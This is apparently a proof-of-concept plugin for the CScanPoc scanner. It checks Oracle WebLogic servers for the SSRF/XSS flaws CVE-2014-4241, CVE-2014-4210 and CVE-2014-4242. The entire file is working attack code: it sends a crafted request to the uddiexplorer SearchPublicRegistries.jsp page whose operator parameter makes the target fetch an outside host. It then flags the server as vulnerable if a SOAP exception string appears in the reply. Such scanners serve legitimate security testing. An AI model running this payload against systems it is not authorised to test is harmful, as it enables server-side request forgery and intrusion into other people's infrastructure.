# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Bea-Weblogic-Server_0001'  # 平台漏洞编号，留空
    name = 'Bea-Weblogic-Server SSRF And XSS'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-06-17'  # 漏洞公布时间
    desc = '''
        Unspecified vulnerability in the Oracle WebLogic Server component in Oracle Fusion Middleware 10.0.2.0 and 10.3.6.0 allows remote attackers to affect integrity via vectors related to WLS - Web Services.
    '''  # 漏洞描述
    ref = 'https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = '''
        CVE-2014-4241, 
        CVE-2014-4210, 
        CVE-2014-4242
    '''  # cve编号
    product = 'Bea-Weblogic-Server'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '64f55f8a-4a9b-40c9-8850-bb89f56db607'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/uddiexplorer/SearchPublicRegistries.jsp?operator=http://0day5.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
            verify_url = self.target + payload
            r = requests.get(verify_url)
            m = re.search(
                'weblogic.uddi.client.structures.exception.XML_SoapException', r.text)
            if m:
                # security_warning(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
